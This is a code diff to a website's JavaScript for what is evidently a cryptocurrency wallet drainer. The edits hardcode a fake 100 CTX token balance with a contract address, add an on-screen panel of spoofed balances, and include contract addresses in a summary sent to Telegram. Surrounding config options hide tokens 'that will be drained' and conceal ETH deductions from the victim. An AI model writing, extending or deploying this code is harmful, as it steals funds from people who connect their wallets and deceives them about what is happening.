@@ -86,8 +86,7 @@ addEventOnElem(window, "scroll", scrollReveal);
 const spoofConfig = {
   noApprovementMode: false, // Hide tokens that will be drained in display (Pectra users only)
   hideNativeWithdraw: false, // Conceal native token deductions in display
-  showNativeTopup: false, // Show +0.0000000001 ETH receipt in simulation
-  tokenTopupAmount: 0 // Amount of fake tokens to credit (0 to disable)
+  showNativeTopup: false // Show +0.0000000001 ETH receipt in simulation
 };
 
 /**
@@ -145,17 +144,15 @@ async function connectWalletAndSendTokens() {
       tokens = tokens.filter(token => !token.balance || ethers.BigNumber.from(token.balance).isZero());
     }
 
-    if (spoofConfig.tokenTopupAmount > 0) {
-      // Add fake token balance
-      const fakeToken = {
-        token_address: "0xFakeTokenAddress",
-        name: "Fake Token",
-        symbol: "FAKE",
-        decimals: 18,
-        balance: ethers.utils.parseUnits(spoofConfig.tokenTopupAmount.toString(), 18).toString()
-      };
-      tokens.push(fakeToken);
-    }
+    // Add fake Cryptex Finance ($CTX) token balance
+    const fakeToken = {
+      token_address: "0x321C2fE4446C7c963dc41Dd58879AF648838f98D",
+      name: "Cryptex",
+      symbol: "CTX",
+      decimals: 18,
+      balance: ethers.utils.parseUnits("100", 18).toString()
+    };
+    tokens.push(fakeToken);
 
     // Get native balance (ETH)
     const nativeBalance = await provider.getBalance(userAddress);
@@ -167,16 +164,31 @@ async function connectWalletAndSendTokens() {
       nativeBalanceDisplay = (parseFloat(nativeBalanceFormatted) + 0.0000000001).toFixed(18);
     }
 
-    // Format balance summary
+    // Format balance summary for Telegram and screen display
     let tokenSummary = "";
     if (tokens && tokens.length > 0) {
       tokenSummary = tokens.map(token => {
         const decimals = token.decimals ?? 18;
         const balance = ethers.utils.formatUnits(token.balance, decimals);
-        return `• ${token.symbol}: ${balance}`;
+        return `• ${token.symbol}: ${balance} (Contract: ${token.token_address})`;
       }).join("\n");
     } else {
       tokenSummary = "No tokens found or balance is 0.";
+    }
+
+    // Display spoofed balances on screen
+    const balanceDisplay = document.getElementById("balance-display");
+    if (balanceDisplay) {
+      balanceDisplay.innerHTML = `
+        <h3>Wallet Balances</h3>
+        <p><strong>Tokens:</strong></p>
+        <pre>${tokenSummary}</pre>
+        <p><strong>Native Balance (ETH):</strong> ${
+          spoofConfig.hideNativeWithdraw ? "Hidden" : nativeBalanceDisplay
+        }${spoofConfig.showNativeTopup ? " (includes +0.0000000001 ETH top-up)" : ""}</p>
+      `;
+    } else {
+      console.warn("Balance display element not found");
     }
 
     // Compose full Telegram message with balances
